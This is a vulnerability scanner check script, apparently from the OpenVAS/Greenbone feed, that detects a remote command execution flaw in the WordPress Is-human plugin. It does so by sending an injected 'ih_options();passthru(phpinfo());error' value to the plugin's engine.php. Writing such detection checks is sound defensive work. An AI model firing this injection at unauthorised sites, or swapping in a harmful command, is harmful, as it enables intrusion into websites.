CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802021" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2011-05-26 10:47:46 +0200 (Thu, 26 May 2011)" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_name( "WordPress Is-human Plugin 'passthru()' Function Remote Command Execution Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "wordpress/installed" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/67500" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/17299" );
	script_xref( name: "URL", value: "http://wordpress.org/extend/plugins/is-human" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/view/101497" );
	script_tag( name: "impact", value: "Successful exploitation will let remote attackers to execute
  malicious commands in the context of an affected site, also remote code execution is possible." );
	script_tag( name: "affected", value: "Is-human WordPress plugin version 1.4.2 and prior." );
	script_tag( name: "insight", value: "The flaws are caused by improper validation of user-supplied
  input to the 'passthru()' function in 'wp-content/plugins/is-human/engine.php',
  which allows attackers to execute commands in the context of an affected site." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is installed with WordPress Is-human Plugin and is
  prone to remote command execution vulnerability." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/wp-content/plugins/is-human/engine.php?action=log-reset&type=ih_options();passthru(phpinfo());error";
req = http_get( item: url, port: port );
res = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
if(ContainsString( res, ">phpinfo()<" ) && ContainsString( res, ">System <" ) && ContainsString( res, ">Configuration<" ) && ContainsString( res, ">PHP Core<" )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

